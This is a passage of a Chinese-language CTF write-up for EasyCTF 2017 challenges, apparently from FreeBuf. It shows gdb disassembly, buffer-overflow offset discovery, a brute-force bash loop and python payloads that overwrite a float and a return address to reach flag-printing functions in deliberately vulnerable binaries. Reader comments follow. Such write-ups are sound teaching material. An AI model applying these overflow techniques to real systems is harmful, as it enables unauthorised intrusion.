&lt;+94&gt;: &nbsp; &nbsp;call &nbsp; 0x804857b &lt;give_flag&gt;</p><p>&nbsp; &nbsp;0x0804866a &lt;+99&gt;: &nbsp; &nbsp;jmp &nbsp; &nbsp;0x804867e &lt;main+119&gt;</p><p>&nbsp; &nbsp;0x0804866c &lt;+101&gt;: &nbsp; &nbsp;fstp &nbsp; st(0)</p><p>&nbsp; &nbsp;0x0804866e &lt;+103&gt;: &nbsp; &nbsp;sub &nbsp; &nbsp;esp,0xc</p><p>&nbsp; &nbsp;0x08048671 &lt;+106&gt;: &nbsp; &nbsp;push &nbsp; 0x8048764</p><p>&nbsp; &nbsp;0x08048676 &lt;+111&gt;: &nbsp; &nbsp;call &nbsp; 0x8048410 &lt;puts@plt&gt;</p><p>&nbsp; &nbsp;0x0804867b &lt;+116&gt;: &nbsp; &nbsp;add &nbsp; &nbsp;esp,0x10</p><p>&nbsp; &nbsp;0x0804867e &lt;+119&gt;: &nbsp; &nbsp;mov &nbsp; &nbsp;eax,0x0</p><p>&nbsp; &nbsp;0x08048683 &lt;+124&gt;: &nbsp; &nbsp;mov &nbsp; &nbsp;ecx,DWORD PTR [ebp-0x4]</p><p>&nbsp; &nbsp;0x08048686 &lt;+127&gt;: &nbsp; &nbsp;leave &nbsp;</p><p>&nbsp; &nbsp;0x08048687 &lt;+128&gt;: &nbsp; &nbsp;lea &nbsp; &nbsp;esp,[ecx-0x4]</p><p>&nbsp; &nbsp;0x0804868a &lt;+131&gt;: &nbsp; &nbsp;ret &nbsp; &nbsp;</p><p>End of assembler dump.</p></code></pre>
</p>
</p>
<p>大致看了之后看到其中的</p>
</p>
<pre><code><p>&nbsp; &nbsp;0x0804863c &lt;+53&gt;: &nbsp; &nbsp;fld &nbsp; &nbsp;DWORD PTR [ebp-0xc]</p><p>&nbsp; &nbsp;0x0804863f &lt;+56&gt;: &nbsp; &nbsp;fld &nbsp; &nbsp;DWORD PTR ds:0x804876c</p><p>&nbsp; &nbsp;0x08048645 &lt;+62&gt;: &nbsp; &nbsp;fucomip st,st(1)</p></code></pre>
</p>
</p>
<p>根据题意就是溢出覆盖 <b>ebp-0xc</b> 的值使之和 <b>0x804876c</b> 所指的值相等。于是不断尝试输入查看 <b>ebp-0xc</b> 所指的值的变化当输入64个A字符时没有覆盖</p>
</p>
<pre><code><p>(gdb) set disassembly-flavor intel</p><p>(gdb) b main</p><p>Breakpoint 1 at 0x8048615</p><p>(gdb) r &lt; 64A.txt&nbsp;</p><p>Starting program: /home/sunnyelf/Desktop/doubly_dangerous &lt; 64A.txt</p><p>Breakpoint 1, 0x08048615 in main ()</p><p>(gdb) x/wx $ebp-0xc</p><p>0xbffff0fc: 0x080486b1</p></code></pre>
</p>
</p>
<p>当输入65个A字符时开始覆盖A字符的ASCII码的十六进制是41</p>
</p>
<pre><code><p>(gdb) r &lt; 65A.txt&nbsp;</p><p>Starting program: /home/sunnyelf/Desktop/doubly_dangerous &lt; 65A.txt</p><p>Breakpoint 1, 0x08048615 in main ()</p><p>(gdb) x/wx $ebp-0xc</p><p>0xbffff0fc: &nbsp; &nbsp;0x08048641</p></code></pre>
</p>
</p>
<p>接下再看一下 <b>0x804876c</b> 所指的值</p>
</p>
<pre><code><p>(gdb) x/wx 0x804876c</p><p>0x804876c: 0x41348000</p></code></pre>
</p>
</p>
<p>于是构造payload <b>&#8216;A&#8217; * 64 + &#8216;\x00\x80\x34\x41&#8242;</b></p>
</p>
<pre><code><p>python -c "print 'A'*64 + '\x00\x80\x34\x41'" | ./doubly_dangerous</p><p>Give me a string:&nbsp;</p><p>Success! Here is your flag:</p><p>easyctf{bofs_and_floats_are_d0uble_tr0uble!}</p></code></pre>
</p>
</p>
<h3>Simple Rop</h3>
</p>
<p><b>problem</b></p>
</p>
<p>On the shell there is a folder <b>/problems/simple-rop</b>.</p>
</p>
<p>Read <b>flag.txt</b></p>
</p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/simple-rop/simple-rop.c" target="_blank">Source</a></p>
</p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/simple-rop/simple-rop" target="_blank">Binary</a></p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>// simple-rop.c</p><p>#define _GNU_SOURCE</p><p>#include &lt;stdio.h&gt;</p><p>#include &lt;stdlib.h&gt;</p><p>#include &lt;sys/types.h&gt;</p><p>void print_flag();</p><p>void what_did_you_say();</p><p>int main(int argc, char* argv[])</p><p>{</p><p>&nbsp; &nbsp; gid_t gid = getegid();</p><p>&nbsp; &nbsp; setresgid(gid, gid, gid);</p><p>&nbsp; &nbsp; what_did_you_say();</p><p>&nbsp; &nbsp; return 0;</p><p>}</p><p>void print_flag()</p><p>{</p><p>&nbsp; &nbsp; system("cat flag.txt");</p><p>}</p><p>void what_did_you_say()</p><p>{</p><p>&nbsp; &nbsp; char buff[64];</p><p>&nbsp; &nbsp; gets(buff);</p><p>&nbsp; &nbsp; printf("You said: %s\n", buff);</p><p>}</p></code></pre>
</p>
</p>
<p>看了源码很显然要让我们调用print_flag()函数于是先gdb看一下print_flag()函数的地址</p>
</p>
<pre><code><p>(gdb) disas print_flag</p><p>Dump of assembler code for function print_flag:</p><p>&nbsp; &nbsp;0x0804851a &lt;+0&gt;: &nbsp; &nbsp;push &nbsp; %ebp</p><p>&nbsp; &nbsp;0x0804851b &lt;+1&gt;: &nbsp; &nbsp;mov &nbsp; &nbsp;%esp,%ebp</p><p>&nbsp; &nbsp;0x0804851d &lt;+3&gt;: &nbsp; &nbsp;sub &nbsp; &nbsp;$0x8,%esp</p><p>&nbsp; &nbsp;0x08048520 &lt;+6&gt;: &nbsp; &nbsp;sub &nbsp; &nbsp;$0xc,%esp</p><p>&nbsp; &nbsp;0x08048523 &lt;+9&gt;: &nbsp; &nbsp;push &nbsp; $0x80485e0</p><p>&nbsp; &nbsp;0x08048528 &lt;+14&gt;: &nbsp; &nbsp;call &nbsp; 0x80483a0 &lt;system@plt&gt;</p><p>&nbsp; &nbsp;0x0804852d &lt;+19&gt;: &nbsp; &nbsp;add &nbsp; &nbsp;$0x10,%esp</p><p>&nbsp; &nbsp;0x08048530 &lt;+22&gt;: &nbsp; &nbsp;nop</p><p>&nbsp; &nbsp;0x08048531 &lt;+23&gt;: &nbsp; &nbsp;leave &nbsp;</p><p>&nbsp; &nbsp;0x08048532 &lt;+24&gt;: &nbsp; &nbsp;ret &nbsp; &nbsp;</p><p>End of assembler dump.</p></code></pre>
</p>
</p>
<p>地址为0x0804851a缓存为64字符所以写个shell脚本跑一下</p>
</p>
<pre><code><p>#!/bin/bash &nbsp;</p><p>for i in {64..80}; &nbsp;</p><p>do</p><p>&nbsp; &nbsp; python -c "print 'A' * $i + '\x1a\x85\x04\x08'" | ./simple-rop</p><p>done</p></code></pre>
</p>
</p>
<p>当跑到 python -c &#8216;print &#8220;A&#8221;*76+&#8221;\x1a\x85\x04\x08&#8243;&#8216; | ./simple-rop 成功调用print_flag()函数</p>
</p>
<pre><code>easyctf{r0p_7o_v1ct0ry}</code></pre>
</p>
<p>最后欢迎表哥来<a href="https://www.hackfun.org/" target="_blank">博客</a>玩耍P</p>
</p>
<p><b style="color: rgb(159, 163, 168);">* 本文作者：精灵，转载请注明来自FreeBuf.COM</b></p>
                                                    </div>
                        <div class="article-oper article-oper-new">
                            <style>
                                @font-face {font-family: 'iconfont';
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
                                    url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
                                    url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
                                    url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
                                }
                            </style>
                            <div class="share-new clearfix">
                                <div class="share-author">
                                                                            <a href="http://www.freebuf.com/author/精灵" title="由 精灵 发布" rel="author">
                                            <img src="http://image.3001.net/images/20170329/14907409938657.jpg!video" width="0" height="0" alt="精灵" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo" />                                            <!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
                                        </a>
                                        <div class="share-author-info">
                                                                                        <a class="author-name" href="http://www.freebuf.com/author/精灵">精灵</a>
                                            <!--<span class="icon-f"></span>-->
                                            <span>
                                <i class="colour-red">
                                    3                                </i>
                                篇文章</span>
                                            <span>等级：
                                <i class="colour-green">2</i>级
                            </span>
                                        </div>
                                                                                                        </div>
                                <div class="user-center clearfix">
                                                                            <a href="http://www.freebuf.com/author/精灵" data-toggle="tooltip" data-placement="top" title="个人主页" class="home" target="_blank"></a>
                                                                        <a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=精灵" data-toggle="tooltip" data-placement="top" title="私信" class="letter" target="_blank"></a>
                                </div>
                                <div class="share-ctrl clearfix">
                                                                        <div class="bdsharebuttonbox clearfix bdshare-button-style1-24 columnstatus"
                                         data-bd-bind="1489991449190" data-column="" data-title="EasyCTF 2017 Writeup" data-name="">
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="tsina" title="分享到新浪微博" id="tsina"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="weixin" title="分享到微信" id="weixin"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="qzone" title="分享到QQ空间" id="qzone"></a>
                                       <!-- _shareUrlWeibo = 'http://service.weibo.com/share/share.php?url=http://'+encodeURIComponent(_json[i].url)+'&title='+encodeURIComponent(_json[i].title)+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareUrlZone = 'http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://'+encodeURIComponent(_json[i].url)+'&title='+_json[i].title+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareSrc = 'http://s.jiathis.com/qrcode.php?url=http://'+_json[i].url;-->
                                        <span class="share-line">|</span>
                                    </div>
                                </div>
                                <div class="user-ctrl clearfix">
                                                                            <a href="http://www.freebuf.com/oauth" id="collect" data-toggle="tooltip" data-placement="top" title="收藏" ></a>
                                                                        <a href="#respond" data-toggle="tooltip" data-placement="top" title="评论" id="comments"></a>
                                                                        <!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
                                    <span class="share-line">|</span>
                                    <span class="info-alert"></span>
                                </div>
                            </div>
                            <script>
                                var column = $('.columnstatus').attr('data-column');
                                var text = '';
                                if(column){
                                    var title = $('.columnstatus').attr('data-title');
                                    var name = $('.columnstatus').attr('data-name');
                                    text = title+' - FreeBuf专栏·'+name;
                                }
                                window._bd_share_config={
                                    "common": {
                                        "bdSnsKey": {},
                                        "bdText": text,
                                        "bdMini": "2",
                                        "bdMiniList": ["qzone", "tsina", "weixin"],
                                        "bdPic": "",
                                        "bdStyle": "1",
                                        "bdSize": "24"
                                    },
                                    "share":{},
                                };
                                with(document)0[
                                    (getElementsByTagName('head')[0]||body).
                                    appendChild(createElement('script')).
                                        src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
                                    ];
                                //控制垂直方向分享模块的定位
                                function shareFixVertical(){
                                    var offsetTop = jQuery(".article-oper").get(0).offsetTop;
                                    var win_h = jQuery(window).height();
                                    var win_w = jQuery(window).width();
                                    var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
                                    var _height = offsetTop-scrollTop;
                                    var _flag = $('.column-article').attr('data-column');
                                    if(_flag == 1) {
                                        if(_height>=win_h-660&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }else {
                                        if(_height>=win_h-255&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }
                                }
                                //控制水平方向分享模块的定位
                                function shareFixHorizontal(){
                                    var _width = jQuery("#getWidth").innerWidth()-30;
                                    var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                    var win_w = document.documentElement.clientWidth || document.body.clientWidth;
                                    jQuery(".fixed").css({
                                        width:_width,
                                        left:_left
                                    });
                                    if(win_w< 975){
                                        jQuery(".share-new").css({
                                            width: "100%",
                                            left: "0"
                                        });
                                    }else{
                                        var _width = jQuery("#getWidth").innerWidth()-30;
                                        var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                        jQuery(".fixed").css({
                                            width:_width,
                                            left:_left
                                        });
                                    }
                                }
                                function click(){
                                    var _w = jQuery(window).width();
                                    jQuery(document).click(function(e){
                                        if(jQuery(e.target).attr("id")=="weixin"){
                                            if(_w <= 760) {
                                                jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                                layer.open({
                                                    title: '提示',
                                                    btnAlign: 'c',
                                                    content: '请使用手机浏览器自带的分享功能分享该页面',
                                                    area: '260px'
                                                });
                                            }else {
                                                jQuery("#bdshare_weixin_qrcode_dialog").show();
                                            }
                                        }else {
                                            jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                        }
                                    });
                                }

                                jQuery(window).on("load",function(){
                                    shareFixVertical();
                                    click();
                                });

                                jQuery(window).on("scroll",function(){
                                    //判断滚轮方向
                                    var agent = navigator.userAgent;
                                    if (/.*Firefox.*/.test(agent)) {
                                        document.addEventListener("DOMMouseScroll", function(e) {
                                            e = e || window.event;
                                            var detail = e.detail;
                                            if (detail > 0) {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            } else {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            }
                                        });
                                    } else {
                                        document.onmousewheel = function(e) {
                                            e = e || window.event;
                                            var wheelDelta = e.wheelDelta;
                                            if (wheelDelta > 0) {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            } else {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            }
                                        }
                                    }
                                });


                                jQuery(window).on("resize",function(){
                                    shareFixHorizontal();
                                    click();
                                })

                                //tooltips提示
                                $(function () { $("[data-toggle='tooltip']").tooltip(); });
                            </script>
                        </div>
                                                                                                                            <div class="article-pager ">
                                <ul>
                                    <li class="previous"><span>上一篇：</span><a href="http://www.freebuf.com/articles/rookie/131542.html" rel="prev">验证码安全那些事</a>                                    </li>
                                    <li class="next"><span>下一篇：</span>
                                        <a href="http://www.freebuf.com/articles/terminal/131755.html" rel="next">我与支付宝之间的那些事：基于Python与Face++实现人脸识别</a>                                    </li>
                                </ul>
                            </div>
                                            </div>
                </div>
                    <div class="comment-bright"><div class="main-tit04">
    <h3>这些评论亮了</h3></div>      <ul>      <li>
            <div class="user_photo">             <img src="http://image.3001.net/images/headimg/pic5.png">             </div>
            <div class="tit"><span class="name"> 喷子 </span> 
						<span class="explain"></span>
			<span class="reply"><a onclick="return addComment.moveForm( 'comment-','', 'respond','131073' ) " href="?replytocom=#respond" class="comment-reply-link" rel="nofollow">回复</a></span></div>
            <div class="txt">
						写了一篇文章，半个月几个qq群微信群不停的推，到处投稿，就怕天下不知道，有意思吗？</div>
            <div class="but"><span class="vote-count">)</span><span style="none" id="cos_support-2215908" class="vote-count">6</span><span class="vote-count">(</span><span class="vote">  <a class="ilike_icon" id="vote4-2215908" href="javascript:acv_vote(215908,1,2);">亮了</a></span></div>
          </li>
         </ul></div><div class="comment-list">
      <div class="main-tit02">
		<a rel="nofollow" class="btnbtn-default btn-comment" href="#respond">发表评论</a>
        <h3>已有 <span class="color_red">7</span> 条评论
      </div>
      <ul>
         <li class="comment even thread-even depth-1" id="li-comment-215908">
    <div id="comment-215908">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic7.png">     </div>
    <div class="tit"> 
	    <span class="name"> 喷子 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-04-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-215908','215908', 'respond','131073' ) " href="?replytocom=215908#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">1楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>写了一篇文章，半个月几个qq群微信群不停的推，到处投稿，就怕天下不知道，有意思吗？</p>
<div class="comment-tools">
<div class="vote" id="vote-215908"><span id="acv_stat_215908"></span><a class="ilike_icon"  id="vote4-215908" href="javascript:acv_vote(215908,1);">亮了</a>(<span id="cos_support-215908">6</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="215908" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="215908" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="215908" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="215908" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="215908" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-250634 odd alt thread-odd thread-alt depth-1" id="li-comment-215913">
    <div id="comment-215913">
        <div class="photo"> <a href="http://www.freebuf.com/author/昊秋">
    <img src="http://image.3001.net/images/20170415/14922240779555.png!video"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/昊秋" target="_blank">昊秋&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain"> CTRL+V </span>
		<span class="time">&nbsp;2017-04-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-215913','215913', 'respond','131073' ) " href="?replytocom=215913#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">2楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>不错真棒 您的博客我关注了。</p>
<div class="comment-tools">
<div class="vote" id="vote-215913"><span id="acv_stat_215913"></span><a class="ilike_icon"  id="vote4-215913" href="javascript:acv_vote(215913,1);">亮了</a>(<span id="cos_support-215913">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="215913" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="215913" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="215913" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="215913" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="215913" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-even depth-1" id="li-comment-215944">
    <div id="comment-215944">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic18.png">     </div>
    <div class="tit"> 
	    <span class="name"> Ttest </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-04-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-215944','215944', 'respond','131073' ) " href="?replytocom=215944#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">3楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>CTF毫无意义。给你几个站你日的下？</p>
<div class="comment-tools">
<div class="vote" id="vote-215944"><span id="acv_stat_215944"></span><a class="ilike_icon"  id="vote4-215944" href="javascript:acv_vote(215944,1);">亮了</a>(<span id="cos_support-215944">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="215944" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="215944" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="215944" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="215944" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="215944" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-24788 odd alt depth-2" id="li-comment-216034">
    <div id="comment-216034">
        <div class="photo"> <a href="http://www.freebuf.com/author/大夫">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/大夫" target="_blank">大夫&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(3级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-04-16</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-216034','216034', 'respond','131073' ) " href="?replytocom=216034#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ Ttest  他们还是孩子</p>
<div class="comment-tools">
<div class="vote" id="vote-216034"><span id="acv_stat_216034"></span><a class="ilike_icon"  id="vote4-216034" href="javascript:acv_vote(216034,1);">亮了</a>(<span id="cos_support-216034">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="216034" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="216034" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="216034" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="216034" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="216034" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment byuser comment-author-54011 even thread-odd thread-alt depth-1" id="li-comment-216214">
    <div id="comment-216214">
        <div class="photo"> <a href="http://www.freebuf.com/author/黑色双眼">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/黑色双眼" target="_blank">黑色双眼&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(3级)</span>
				<span class="explain"> 门外汉，一直在找能够敲门的砖头 </span>
		<span class="time">&nbsp;2017-04-18</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-216214','216214', 'respond','131073' ) " href="?replytocom=216214#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">4楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>看的内心毫无波动，甚至有点懵比</p>
<div class="comment-tools">
<div class="vote" id="vote-216214"><span id="acv_stat_216214"></span><a class="ilike_icon"  id="vote4-216214" href="javascript:acv_vote(216214,1);">亮了</a>(<span id="cos_support-216214">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="216214" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="216214" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="216214" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="216214" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="216214" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt thread-even depth-1" id="li-comment-216431">
    <div id="comment-216431">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic10.png">     </div>
    <div class="tit"> 
	    <span class="name"> 炖番茄牛肉面<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-04-20</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-216431','216431', 'respond','131073' ) " href="?replytocom=216431#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">5楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>你要去？</p>
<div class="comment-tools">
<div class="vote" id="vote-216431"><span id="acv_stat_216431"></span><a class="ilike_icon"  id="vote4-216431" href="javascript:acv_vote(216431,1);">亮了</a>(<span id="cos_support-216431">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="216431" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="216431" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="216431" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="216431" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="216431" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-216446">
    <div id="comment-216446">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic9.png">     </div>
    <div class="tit"> 
	    <span class="name"> 二次元死宅xuan<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-04-20</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-216446','216446', 'respond','131073' ) " href="?replytocom=216446#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">6楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>只是一些程序，转了方便看而已。。。脑洞真大</p>
<div class="comment-tools">
<div class="vote" id="vote-216446"><span id="acv_stat_216446"></span><a class="ilike_icon"  id="vote4-216446" href="javascript:acv_vote(216446,1);">亮了</a>(<span id="cos_support-216446">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="216446" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="216446" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="216446" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="216446" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="216446" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
      </ul>
      <div class="commentnav page01" style="padding-top:10px; text-align: center;">
               </div>
	  
<script src="http://www.freebuf.com/buf/themes/freebuf/js/ajaxfileupload.js" type="text/javascript"></script>
<div id="respond" class="comment-box">
<input type="file" id="uploadUnit" name="upfile" class="hidden" value="">
    <form action="http://www.freebuf.com/wp-comments-post.php" method="post" id="commentform">
        <div id="comment-author-info">
	    <div class="login-other">
		  <div class="login_button login_icon_sina" title="使用新浪微博登陆" onclick="login_button_click('sina')"></div>
          <div class="login_button login_icon_qq" title="使用腾讯QQ登陆" onclick="login_button_click('qq')"></div></div>
        <div class="login-input">
	    <p><label for="author">昵称</label>
		          <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required='true' placeholder = "请输入昵称" required />
        </p><span>必须</span><span>您当前尚未登录。<a  class="simplemodal-login" href="http://www.freebuf.com/oauth" title="登陆">登陆？</a><a  href="https://account.tophant.com/register.html" target="_blank">注册</a></span></div>
		<div class="login-input">
